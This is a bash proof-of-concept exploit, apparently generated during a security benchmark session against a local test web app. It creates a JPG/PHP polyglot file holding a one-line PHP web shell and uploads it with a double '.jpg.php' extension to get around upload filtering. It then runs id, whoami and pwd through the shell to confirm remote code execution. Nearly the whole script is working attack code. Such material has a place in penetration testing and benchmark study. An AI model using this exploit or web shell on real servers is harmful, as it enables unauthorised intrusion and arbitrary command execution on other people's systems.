#!/bin/bash
# POC: Demonstrates Remote Code Execution via double extension file upload bypass. Creates a polyglot JPG file with embedded PHP code and uploads it with a .jpg.php extension, then executes arbitrary commands via the web server.
# Target: ./repo
# Created: 2025-11-07T19:26:32.572Z
# Session: benchmark-XBEN-067-24-mhp8bhdm

# RCE via Double Extension File Upload Bypass POC
# Tests arbitrary file upload vulnerability with double extension bypass

set -e

TARGET_URL="${1:-http://localhost:8080/index.php}"
TARGET_HOST=$(echo "$TARGET_URL" | cut -d'/' -f3)
UPLOAD_DIR="${2:-/upload}"

echo "[*] RCE via Double Extension File Upload POC"
echo "[*] Target: $TARGET_URL"
echo "[*] Upload directory: $UPLOAD_DIR"

# Create a polyglot JPG file with embedded PHP code
# JPG magic bytes (FF D8 FF E0) followed by PHP payload and JPG end marker (FF D9)
SHELL_FILE="/tmp/shell_payload.jpg.php"
PHP_PAYLOAD='<?php system($_GET["cmd"]); ?>'

# Create polyglot file with valid JPG header and embedded PHP
# FF D8 FF E0 = JPEG SOI (Start of Image) + APP0 marker
# The file is valid JPEG but also contains executable PHP
printf '\xFF\xD8\xFF\xE0' > "$SHELL_FILE"
printf '\x00\x10JFIF\x00\x01' >> "$SHELL_FILE"
echo -n "$PHP_PAYLOAD" >> "$SHELL_FILE"
printf '\xFF\xD9' >> "$SHELL_FILE"

echo "[+] Created polyglot JPG/PHP file at: $SHELL_FILE"
echo "[+] File contains PHP payload: $PHP_PAYLOAD"

# Upload the file via multipart form data
echo "[*] Uploading file with double extension (shell.jpg.php)..."

UPLOAD_RESPONSE=$(curl -s -X POST "$TARGET_URL" \
  -F "userfile=@$SHELL_FILE;filename=shell.jpg.php" \
  -F "submit=Upload Image")

echo "[*] Upload Response:"
echo "$UPLOAD_RESPONSE"

# Extract the upload path from response
# Look for patterns like: href='upload/shell.jpg.php' or href="upload/shell.jpg.php"
UPLOAD_PATH=$(echo "$UPLOAD_RESPONSE" | grep -oP "href=['\"]upload/[^'\"]+\.php['\"]" | head -1 | cut -d"'" -f2 | cut -d'"' -f2)

if [ -z "$UPLOAD_PATH" ]; then
    echo "[-] Could not extract upload path from response"
    echo "[-] Trying to construct default path..."
    UPLOAD_PATH="upload/shell.jpg.php"
fi

echo "[+] Detected upload path: $UPLOAD_PATH"

# Construct the full URL to access the uploaded file
SHELL_URL="http://$TARGET_HOST/$UPLOAD_PATH"

echo "[*] Attempting to execute RCE via: $SHELL_URL?cmd=id"
echo ""

# Execute command via the uploaded PHP shell
RCE_RESULT=$(curl -s "$SHELL_URL?cmd=id")

echo "[+] RCE Execution Result:"
echo "$RCE_RESULT"
echo ""

# Verify successful execution
if echo "$RCE_RESULT" | grep -q "uid="; then
    echo "[✓] SUCCESS: Remote Code Execution confirmed!"
    echo "[✓] Server executed arbitrary PHP command"
    echo "[✓] Command output: $RCE_RESULT"
    
    # Test additional commands to confirm
    echo ""
    echo "[*] Testing additional commands..."
    
    echo "[*] Testing: whoami"
    WHOAMI_RESULT=$(curl -s "$SHELL_URL?cmd=whoami")
    echo "[+] Result: $WHOAMI_RESULT"
    
    echo "[*] Testing: pwd"
    PWD_RESULT=$(curl -s "$SHELL_URL?cmd=pwd")
    echo "[+] Result: $PWD_RESULT"
    
    echo ""
    echo "[+] Vulnerability confirmed: Double extension file upload RCE is exploitable"
    echo "[+] File uploaded as: $UPLOAD_PATH"
    echo "[+] File is executable: $SHELL_URL"
    
    # Cleanup
    rm -f "$SHELL_FILE"
    exit 0
else
    echo "[-] RCE execution may have failed"
    echo "[-] Response did not contain expected uid output"
    echo "[-] Raw response: $RCE_RESULT"
    
    # Cleanup
    rm -f "$SHELL_FILE"
    exit 1
fi